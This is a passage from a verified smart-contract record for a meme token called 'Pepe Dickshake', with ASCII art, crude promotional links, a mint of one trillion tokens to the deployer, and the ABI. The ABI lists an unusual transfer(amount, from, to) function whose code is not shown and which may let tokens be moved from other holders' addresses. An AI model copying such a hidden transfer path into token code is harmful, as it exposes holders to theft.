u28b8\u281f\u28bf\u28fe\u28f7\u28ff\u28f7\u2889\u285c\u28e1\u2813\u2874\u2811\u28fc\u285f\u28e9\u2891\u28fe\u289b\u281b\u285d\u285b\u2896\u283b\u2867\u28c4\u28c0\u28f4\u281e\u2876\u28a6\u28c0\u28e4\u2864\u28a4\u2864\u287f\u2834\u286c\u28ad\u283f\u283f\u28af\u284d\u287b\u283f\u28dd\u281b\u284f\u28bf\u28ff\u28ff\u28fd\u28fe\u28ff\u2869\u28c9\u2835\u28a8\u28f8\u2800\u2800\\n\u2800\u2800\u2818\u28ff\u28a0\u280b\u284d\u28ec\u2811\u28aa\u28b0\u28a1\u280b\u28f4\u28a9\u2854\u28a9\u2813\u28fe\u28a1\u280a\u28b1\u284c\u28a9\u284c\u28b1\u28b0\u2808\u284d\u28ff\u28f7\u28fe\u284f\u285d\u28a0\u281a\u28e4\u28a2\u2811\u28e6\u2811\u28aa\u2810\u28a1\u280a\u28ff\u2854\u28f7\u285e\u28a1\u281a\u28fd\u28ff\u28fd\u28fe\u28f7\u285f\u28b1\u284c\u28aa\u2845\u28fe\u2800\u2800\\n\u2800\u2800\u2800\u28b7\u28ce\u2812\u286d\u28b0\u2849\u288e\u2826\u28a9\u281c\u2864\u2883\u2836\u2821\u289e\u28ff\u287e\u283c\u2836\u283e\u28b6\u289b\u28f6\u28f6\u28e7\u28a7\u28f1\u28c1\u28c6\u2879\u2837\u28cc\u28d2\u28cc\u28e2\u28d1\u2860\u288d\u2842\u2813\u28cc\u28f2\u28fd\u28b7\u2870\u288c\u2823\u288e\u2870\u2899\u282f\u287f\u283f\u2858\u28a2\u2851\u282a\u28bc\u284f\u2800\u2800\\n\u2800\u2800\u2800\u2808\u28af\u2853\u28cc\u2823\u285c\u28ac\u2858\u28e1\u281a\u2834\u28c9\u2832\u28c9\u2806\u28fc\u2823\u285c\u28e9\u2831\u288c\u28a6\u287f\u2818\u282f\u28dd\u28f3\u287f\u28fb\u28d6\u28fe\u281f\u2801\u2800\u2808\u2839\u28cf\u2839\u28d9\u282b\u288d\u2869\u28f9\u2846\u285c\u28a2\u2859\u2826\u2871\u28c9\u2826\u2861\u2883\u284d\u2826\u2831\u28e9\u287f\u2801\u2800\u2800\\n\u2800\u2800\u2800\u2800\u2808\u28f7\u2820\u2853\u285c\u2870\u2858\u28a4\u2859\u28a6\u28a1\u2813\u286c\u28b8\u2867\u2871\u2858\u28a4\u2813\u284c\u28fe\u2847\u2800\u2800\u2800\u2809\u280b\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u28e7\u2813\u286c\u2851\u280e\u2854\u28a1\u28f7\u280c\u2871\u288c\u28a3\u2851\u2886\u28a3\u2851\u28a3\u281c\u284c\u28a3\u287f\u2801\u2800\u2800\u2800\\n\u2800\u2800\u2800\u2800\u2800\u2818\u28e7\u2831\u288c\u2871\u2889\u2826\u2858\u2886\u28a3\u2849\u2886\u28ff\u2830\u28e1\u2819\u2886\u2879\u2830\u28fd\u2803\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b9\u280e\u2834\u28c9\u289a\u2858\u2824\u28f9\u284e\u2834\u2849\u2886\u282d\u2858\u28a2\u2849\u2886\u2833\u28cc\u28ff\u2803\u2800\u2800\u2800\u2800\\n\\nCheck more about Dickshake concept:\\n\\n// https://pepedickshake.wtf\\n// https://x.com/pepedickshake\\n// https://medium.com/@PDShake/why-dickshaking-is-better-for-building-a-longstanding-business-relationships-pepefck42069\\n                                                                             \\n*/\\ncontract PDS is ZE20 {\\n    constructor() ZE20(\\\"Pepe Dickshake\\\", \\\"PDS\\\") {\\n        _mint(msg.sender, 1_000_000_000_000 * 10 ** decimals());\\n    }\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSpender\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PDS", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://8510c02520572088b03ddd4c5a154e1c87a0c3dbeb1b06bd49f4eccaef17ce83"}